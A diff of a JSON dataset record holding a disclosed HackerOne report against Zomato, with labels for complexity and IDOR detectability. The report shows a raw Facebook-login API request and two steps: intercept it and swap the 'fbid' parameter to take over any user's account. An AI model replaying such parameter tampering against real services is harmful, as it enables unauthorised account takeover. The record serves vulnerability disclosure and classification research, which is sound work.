@@ -1,48 +1,48 @@
 {
-    "reported_to": "Zomato",
-    "reported_by": "bhavukjain1 ",
-    "title": "Unauthorised Access to Anyone's User Account",
-    "content": "\nWhen we do Login with Facebook on the Zomato app, you're doing zero authentication of the user. I'm able to hack into the targeted user's accounts by just using the Facebook ID.\nAffected API raw request:\nPOST /v2/auth.json?presentlat=28.66505699180115&useragent=model_iPod%20touchos_9.3.5v_7.0__t_iPod5,1&app_version=7.0&session_id=41&app_run_id=21&presentlon=77.32215271029096&lang=en&push_permission=1&isFacebook=true&channel_url=&uuid=\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 HTTP/1.1\nHost: 1api.zomato.com\nAccept-Language: en-IN;q=1, nl-IN;q=0.9, it-IN;q=0.8, de-IN;q=0.7, fr-IN;q=0.6\nAccept: /\nUser-Agent: Zomato/6.6.9 (iPod touch; iOS 9.3.5; Scale/2.00)\nX-Zomato-API-Key: \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nContent-Type: application/x-www-form-urlencoded; charset=utf-8\nConnection: keep-alive\napp_version: 7.0\nCookie: PHPSESSID=\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588; fbcity=1; fbtrack=c9bce885893ad8387ae3dc855d6f5b97; zl=en\nContent-Length: 984\nAccept-Encoding: gzip\naccess_token=&client_id=zomato_ios_v2&fb_permission=%5B%22user_friends%22%2C%22email%22%2C%22contact_email%22%2C%22public_profile%22%5D&fb_token=\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588&fbdata=%7B%0A%20%20%22link%22%20%3A%20%22https%3A%5C%2F%5C%2Fwww.facebook.com%5C%2Fapp_scoped_user_id%5C%2F\u2588\u2588\u2588\u2588\u2588%5C%2F%22%2C%0A%20%20%22id%22%20%3A%20%22\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588%22%2C%0A%20%20%22first_name%22%20%3A%20%22Bhavuk%22%2C%0A%20%20%22name%22%20%3A%20%22Bhavuk%20Jain%22%2C%0A%20%20%22gender%22%20%3A%20%22male%22%2C%0A%20%20%22last_name%22%20%3A%20%22Jain%22%2C%0A%20%20%22email%22%20%3A%20%22\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588%40yahoo.co.in%22%2C%0A%20%20%22locale%22%20%3A%20%22en_US%22%2C%0A%20%20%22timezone%22%20%3A%205.5%2C%0A%20%20%22updated_time%22%20%3A%20%222016-12-24T21%3A55%3A30%2B0000%22%2C%0A%20%20%22verified%22%20%3A%20true%0A%7D&fbid=\u2588\u2588\u2588\u2588\u2588\nIn the last parameter, \"fbid\", I just need to replace it with the targeted user's facebook id, and I've been given the access to that user account.\nFor eg, just replace the \"fbid\" parameter with \u2588\u2588\u2588. You'll gain the access to this user's account.\nAlso, using my Facebook access token, I'm able to get the correct facebook ids of the people I'm friends on Facebook with and also the ids of second degree friends as well. So I'm able to hack into their Zomato accounts with ease.\n\n",
-    "severity": [
-        9.0,
-        10.0
+  "reported_to": "Zomato",
+  "reported_by": "bhavukjain1 ",
+  "title": "Unauthorised Access to Anyone's User Account",
+  "content": "\nWhen we do Login with Facebook on the Zomato app, you're doing zero authentication of the user. I'm able to hack into the targeted user's accounts by just using the Facebook ID.\nAffected API raw request:\nPOST /v2/auth.json?presentlat=28.66505699180115&useragent=model_iPod%20touchos_9.3.5v_7.0__t_iPod5,1&app_version=7.0&session_id=41&app_run_id=21&presentlon=77.32215271029096&lang=en&push_permission=1&isFacebook=true&channel_url=&uuid=\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 HTTP/1.1\nHost: 1api.zomato.com\nAccept-Language: en-IN;q=1, nl-IN;q=0.9, it-IN;q=0.8, de-IN;q=0.7, fr-IN;q=0.6\nAccept: /\nUser-Agent: Zomato/6.6.9 (iPod touch; iOS 9.3.5; Scale/2.00)\nX-Zomato-API-Key: \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nContent-Type: application/x-www-form-urlencoded; charset=utf-8\nConnection: keep-alive\napp_version: 7.0\nCookie: PHPSESSID=\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588; fbcity=1; fbtrack=c9bce885893ad8387ae3dc855d6f5b97; zl=en\nContent-Length: 984\nAccept-Encoding: gzip\naccess_token=&client_id=zomato_ios_v2&fb_permission=%5B%22user_friends%22%2C%22email%22%2C%22contact_email%22%2C%22public_profile%22%5D&fb_token=\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588&fbdata=%7B%0A%20%20%22link%22%20%3A%20%22https%3A%5C%2F%5C%2Fwww.facebook.com%5C%2Fapp_scoped_user_id%5C%2F\u2588\u2588\u2588\u2588\u2588%5C%2F%22%2C%0A%20%20%22id%22%20%3A%20%22\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588%22%2C%0A%20%20%22first_name%22%20%3A%20%22Bhavuk%22%2C%0A%20%20%22name%22%20%3A%20%22Bhavuk%20Jain%22%2C%0A%20%20%22gender%22%20%3A%20%22male%22%2C%0A%20%20%22last_name%22%20%3A%20%22Jain%22%2C%0A%20%20%22email%22%20%3A%20%22\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588%40yahoo.co.in%22%2C%0A%20%20%22locale%22%20%3A%20%22en_US%22%2C%0A%20%20%22timezone%22%20%3A%205.5%2C%0A%20%20%22updated_time%22%20%3A%20%222016-12-24T21%3A55%3A30%2B0000%22%2C%0A%20%20%22verified%22%20%3A%20true%0A%7D&fbid=\u2588\u2588\u2588\u2588\u2588\nIn the last parameter, \"fbid\", I just need to replace it with the targeted user's facebook id, and I've been given the access to that user account.\nFor eg, just replace the \"fbid\" parameter with \u2588\u2588\u2588. You'll gain the access to this user's account.\nAlso, using my Facebook access token, I'm able to get the correct facebook ids of the people I'm friends on Facebook with and also the ids of second degree friends as well. So I'm able to hack into their Zomato accounts with ease.\n\n",
+  "severity": [
+    9.0,
+    10.0
+  ],
+  "bounty": null,
+  "weaknesses": [
+    "Improper Authentication - Generic"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1490753580,
+  "report_url": "https://hackerone.com/reports/202921",
+  "is_multi_component": true,
+  "complexity": "HIGH",
+  "novelty": "HIGH",
+  "vuln_category": "API",
+  "steps": [
+    [
+      1,
+      "Perform a login with Facebook on the Zomato app and intercept the API request using a proxy tool like Burp Suite."
     ],
-    "bounty": null,
-    "weaknesses": [
-        "Improper Authentication - Generic"
-    ],
-    "screenshots": {},
-    "disclosed_date": 1490753580,
-    "report_url": "https://hackerone.com/reports/202921",
-    "is_multi_component": true,
-    "complexity": "HIGH",
-    "novelty": "HIGH",
-    "vuln_category": "API",
-    "steps": [
-        [
-            1,
-            "Perform a login with Facebook on the Zomato app and intercept the API request using a proxy tool like Burp Suite."
-        ],
-        [
-            2,
-            "Modify the 'fbid' parameter in the intercepted request to the targeted user's Facebook ID and forward the request."
-        ]
-    ],
-    "vuln_description": "The vulnerability allows unauthorized access to any user's Zomato account by simply replacing the 'fbid' parameter in the Facebook login API request with the targeted user's Facebook ID. The application does not perform proper authentication, enabling account takeover without requiring the attacker to know the victim's credentials.",
-    "reason": "The vulnerability is straightforward to exploit as it only requires modifying a single parameter in the API request. The attack does not involve multiple components, complex application states, or novel logic. The interaction between the components is obvious, and the vulnerability is a classic example of insufficient authentication.",
-    "new_complexity": "LOW",
-    "requires_code": false,
-    "requires_CVE": false,
-    "is_ctf": false,
-    "other_report": null,
-    "idor_detectable": true,
-    "authnz_byppass_detectable": true,
-    "is_simple_payload": false,
-    "injection_metadata": {
-        "is_simple_payload": false
-    },
-    "authnz_metadata": {
-        "idor_detectable": true,
-        "authnz_byppass_detectable": true
-    }
+    [
+      2,
+      "Modify the 'fbid' parameter in the intercepted request to the targeted user's Facebook ID and forward the request."
+    ]
+  ],
+  "vuln_description": "The vulnerability allows unauthorized access to any user's Zomato account by simply replacing the 'fbid' parameter in the Facebook login API request with the targeted user's Facebook ID. The application does not perform proper authentication, enabling account takeover without requiring the attacker to know the victim's credentials.",
+  "reason": "The vulnerability is straightforward to exploit as it only requires modifying a single parameter in the API request. The attack does not involve multiple components, complex application states, or novel logic. The interaction between the components is obvious, and the vulnerability is a classic example of insufficient authentication.",
+  "new_complexity": "LOW",
+  "requires_code": false,
+  "requires_CVE": false,
+  "is_ctf": false,
+  "other_report": null,
+  "idor_detectable": true,
+  "authnz_byppass_detectable": true,
+  "is_simple_payload": false,
+  "injection_metadata": {
+    "is_simple_payload": false
+  },
+  "authnz_metadata": {
+    "reason": "The vulnerability involves swapping the Facebook ID (resource_id) in the authentication request to gain unauthorized access to another user's account. This matches the IDOR vulnerability class where the resource_id (Facebook ID) is substituted to bypass authorization checks. The methodology described includes testing for such scenarios by substituting resource_ids with existing ones to check for authorization bypass, which would cover this case.",
+    "is_detectable": true
+  }
 }
